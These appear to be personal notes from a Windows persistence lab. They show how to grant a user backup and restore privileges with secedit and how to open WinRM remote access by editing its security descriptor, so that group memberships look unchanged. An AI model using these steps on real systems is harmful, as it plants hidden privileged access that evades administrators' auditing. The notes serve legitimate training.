Special Privileges and Security Descriptors

A similar result to adding a user to the Backup Operators group
can be achieved without modifying any group membership

Backup Operators group, it has the following two privileges assigned by default:

    -SeBackupPrivilege: The user can read any file in the system, ignoring any DACL in place.
    -SeRestorePrivilege: The user can write any file in the system, ignoring any DACL in place.

We can assign such privileges to any user, independent of their group memberships. 

To do so, we can use the secedit command. First, we will export the current configuration to a temporary file:

    -secedit /export /cfg config.inf

We open the file and add our user to the lines in the configuration regarding the SeBackupPrivilege and SeRestorePrivilege:
We finally convert the .inf file into a .sdb file which is then used to load the configuration back into the system:

    -secedit /import /cfg config.inf /db config.sdb
    -secedit /configure /db config.sdb /cfg config.inf

We should now have a user with equivalent privileges to any Backup Operator. 
The user still can't log into the system via WinRM, so let's do something about it.

    -> To Check if the user is created:
        -net user

Instead of adding the user to the Remote Management Users group, 
We'll change the security descriptor associated with the WinRM service to allow thmuser2 to connect:

    To enable WinRIM connection POWERSHELL cmd:
    Open the configuration window for WinRM's security descriptor via POWERSHELL:
        -Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI

This will open a window where you can add thmuser2 and assign it "full privileges" to connect to WinRM:

Check if ok:
    -net user thmuser2:
        Local Group Memberships      *Users
        Global Group memberships     *None

In Kali try to connect via WinRM with thmuser2 credentials
